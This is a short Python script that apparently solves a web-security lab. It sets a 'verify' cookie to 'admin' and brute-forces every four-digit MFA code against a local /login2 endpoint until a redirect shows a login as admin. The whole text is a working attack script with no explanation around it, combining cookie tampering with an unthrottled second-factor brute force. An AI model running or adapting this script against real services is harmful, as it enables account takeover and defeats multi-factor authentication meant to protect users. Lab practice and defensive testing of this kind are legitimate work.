import requests
s = requests.Session()
s.cookies.set("verify", "admin")
for n in range(10000):
    code = f"{n:04d}"
    r = s.post("http://127.0.0.1:5000/login2", data={"mfa-code": code}, allow_redirects=False)
    if r.status_code == 302 and "login2" not in r.headers.get("Location", ""):
        print("Found code:", code, "-> logged in as admin")
        break